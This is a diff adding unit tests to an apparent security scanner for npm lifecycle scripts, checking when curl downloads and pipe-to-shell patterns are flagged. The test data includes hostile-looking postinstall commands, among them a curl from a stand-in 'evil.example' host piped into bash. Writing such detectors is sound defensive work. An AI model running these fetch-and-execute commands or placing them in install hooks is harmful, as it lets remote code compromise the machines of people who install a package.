@@ -27,4 +27,34 @@ describe("analyzeLifecycleScripts", () => {
     expect(hasLifecycleScripts({ postinstall: "echo hi" })).toBe(true);
     expect(hasLifecycleScripts({ build: "tsc" })).toBe(false);
   });
+
+  // shell-quote false-positive reduction
+  it("does NOT flag curl appearing only inside an echo string argument", () => {
+    // The pipe is inside a string literal passed to echo, not an actual shell pipe
+    const f = analyzeLifecycleScripts({
+      postinstall: "echo 'install manually: curl https://example.com | sh'",
+    });
+    expect(f.some((x) => x.id === "script-pipe-shell")).toBe(false);
+  });
+
+  it("does NOT flag curl appearing inside an echo as a remote-download command", () => {
+    const f = analyzeLifecycleScripts({
+      postinstall: "echo 'run: curl https://example.com/setup.sh'",
+    });
+    expect(f.some((x) => x.id === "script-remote-download")).toBe(false);
+  });
+
+  it("detects remote-download when curl is the actual command", () => {
+    const f = analyzeLifecycleScripts({
+      postinstall: "curl https://example.com/setup.sh -o /tmp/setup.sh",
+    });
+    expect(f.some((x) => x.id === "script-remote-download")).toBe(true);
+  });
+
+  it("detects pipe-to-bash", () => {
+    const f = analyzeLifecycleScripts({
+      postinstall: "curl https://evil.example/x | bash",
+    });
+    expect(f.some((x) => x.id === "script-pipe-shell")).toBe(true);
+  });
 });
